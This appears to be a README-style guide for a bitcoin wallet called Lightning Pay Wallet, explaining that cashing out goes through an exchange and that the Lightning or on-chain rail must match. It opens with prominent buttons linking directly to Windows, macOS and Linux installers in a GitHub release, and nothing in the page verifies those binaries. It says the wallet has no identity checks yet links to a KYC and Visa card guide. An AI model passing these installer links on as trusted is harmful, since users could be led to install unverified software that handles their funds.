<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Cashing out bitcoin to a bank account

What the wallet can and cannot do, and where the bank rail actually sits.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Lightning Pay Wallet is a wallet, not an exchange. It holds bitcoin and moves it over Lightning and
on-chain; it does not hold a bank account, run identity checks or send money to one. Cashing out means
using a service that does, and understanding which rail each step uses.

## The three steps

Selling bitcoin happens on an exchange or a broker, not in the wallet. The money reaches your bank
from that service, not from Lightning. And the wallet's part is only the first step: getting the
bitcoin from your keys to the service's deposit address or invoice.

So the sequence is: send from the wallet to the service, sell there, withdraw to the bank from there.
Each step has its own waiting time and its own failure modes.

## Matching the rail

The single most expensive mistake is sending on the wrong network. If the service gives you an
on-chain address, send an on-chain transaction. If it gives you a Lightning invoice, pay the invoice.
Sending a Lightning payment to an on-chain address does not work, and sending an on-chain transaction
to a Lightning invoice is not possible by construction.

Where a service supports both, it will show two different deposit methods. Pick the one you actually
intend to use. A transfer that arrives on a network the service does not credit is not recoverable by
the wallet.

## Identity checks happen elsewhere

Exchange accounts require whatever verification the exchange requires, and that is between you and
them. The wallet has no account, no identity and no ability to freeze a balance, which is exactly why
it cannot cash anything out on your behalf.

If a service asks for a deposit memo or a reference, include it. A deposit that lands without one can
be delayed for days while support matches it by hand.

## Timing

A Lightning send settles in seconds. An on-chain send waits for blocks, so a low fee can mean hours.
The sale on the exchange is usually immediate at whatever price the book offers. The bank withdrawal
is the slow part, and it runs on banking hours rather than on bitcoin's.

Plan around the slowest leg. If the price matters, sell first and withdraw afterwards rather than
waiting for a confirmation while the market moves.

## When a withdrawal fails

Almost always a sending-side problem: an unsupported network, a missing memo, a deposit method that
does not accept the asset you sent, or an account restriction unrelated to the wallet. Check the
service's deposit instructions against what you actually sent before assuming the wallet lost it, and
check a block explorer for an on-chain transaction.

The reverse journey, moving bitcoin into exchanges or Cash App, is in
<a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/move-bitcoin-to-exchanges-or-cash-app.md">moving bitcoin to exchanges</a>.

## Questions people ask

### Can the wallet send money to my bank directly?

No. It has no banking relationship and no identity checks. A service that sells bitcoin and pays out
to a bank is the missing piece.

### Why is my cash-out taking days?

Because the bank leg is a bank. On-chain confirmation and the exchange's withdrawal queue add their
own time on top, and neither is controlled by the wallet.

### Is cashing out taxable?

Recording what you sold, when, and for how much is your responsibility, and the wallet's history is
the record of the transfer rather than of the sale. The KYC and reporting side of the product is in
<a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/lightning-pay-kyc-visa-card-and-revenue.md">KYC, the Visa card and how Lightning Pay makes money</a>.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/move-bitcoin-to-exchanges-or-cash-app.md">Moving bitcoin between Lightning Pay and exchanges or Cash App</a>

